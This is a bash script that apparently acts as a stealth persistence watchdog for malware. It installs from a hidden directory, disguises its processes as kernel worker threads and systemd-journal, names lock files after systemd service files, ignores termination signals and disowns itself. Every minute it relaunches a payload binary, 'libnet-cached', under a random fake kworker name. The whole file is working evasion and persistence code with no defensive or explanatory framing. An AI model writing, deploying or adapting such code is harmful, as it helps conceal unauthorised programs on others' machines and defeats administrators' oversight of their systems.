#!/bin/bash

INSTALL_DIR="/var/tmp/.local/share/libnet-cache"
REAL_USER="$USER"

MONITOR_LOCK="/tmp/.systemd-private-ca17f538c11049049fcd4bcb2bc257d4-systemd-logind.service-LOBSFj.lock"
SOFTWARE_LOCK="/tmp/.systemd-private-ca17f538c11049049fcd4bcb2bc257d4-fwupd.service-IcP04g.lock"
CURRENT_USER="${USER:-$(whoami)}"


WATCHDOG_FAKE_NAMES=(
    "[kworker/0:1H]"
    "[kworker/2:2]"
    "[systemd-journal]"
)

SOFTWARE_FAKE_NAMES=(
    "[kworker/1:0] events"
    "[kworker/1:1] events_power_efficient"
    "[kworker/1:2] kblockd"
    "[kworker/u8:2] writeback"
    "[kworker/u8:3] mm_percpu_wq"
)

is_monitor_running() {
    eval "exec 200>\"$MONITOR_LOCK\""
    if flock -n 200; then
        flock -u 200
        return 1
    else
        return 0
    fi
}

launch_monitor() {
    local disguise="${WATCHDOG_FAKE_NAMES[$((RANDOM % ${#WATCHDOG_FAKE_NAMES[@]}))]}"
    local software_names_str=$(declare -p SOFTWARE_FAKE_NAMES)

    export INSTALL_DIR CURRENT_USER MONITOR_LOCK SOFTWARE_LOCK disguise software_names_str

    (
        trap "" HUP INT TERM
        
        exec -a "$disguise" bash <<'EOF'
            eval "$software_names_str"
            SOFTWARE_BIN="$INSTALL_DIR/libnet-cached"
            
            
            eval "exec 200>\"$MONITOR_LOCK\""
            if ! flock -n 200; then
                exit 0
            fi

            log "=========================================="
            log "Monitor started (PID: $$, Name: '$disguise')"
            log "=========================================="

            is_software_running() {
                eval "exec 201>\"$SOFTWARE_LOCK\""
                if flock -n 201; then
                    flock -u 201
                    return 1
                else
                    return 0
                fi
            }
            
start_software() {
                local soft_disguise="${SOFTWARE_FAKE_NAMES[$((RANDOM % ${#SOFTWARE_FAKE_NAMES[@]}))]}"
                
                if [ -f "$SOFTWARE_BIN" ] && [ -s "$SOFTWARE_BIN" ]; then
                    if file "$SOFTWARE_BIN" | grep -q "ELF"; then

                        (
                            eval "exec 201>\"$SOFTWARE_LOCK\""
                            if flock -n 201; then

                                exec -a "$soft_disguise" "$SOFTWARE_BIN" "$@"
                            fi
                        ) >/dev/null 2>&1 &
                    else

                        (
                            eval "exec 201>\"$SOFTWARE_LOCK\""
                            if flock -n 201; then
                                exec -a "$soft_disguise" bash < "$SOFTWARE_BIN"
                            fi
                        ) >/dev/null 2>&1 &
                    fi
                    log "Started softwaretech safely (Pure Memory): $soft_disguise"
                else

                    (
                        eval "exec 201>\"$SOFTWARE_LOCK\""
                        if flock -n 201; then
                            exec -a "$soft_disguise" bash -c 'while true; do sleep 60; done'
                        fi
                    ) >/dev/null 2>&1 &
                    log "SOFTWARE_BIN not found, started empty loop."
                fi
            }
            
            while true; do
                if ! is_software_running; then
                    start_software
                    sleep 2
                fi
                
                sleep 60
            done
EOF
    ) >/dev/null 2>&1 &
    
    disown $! 2>/dev/null
}


if is_monitor_running; then
    exit 0
fi

launch_monitor
exit 0
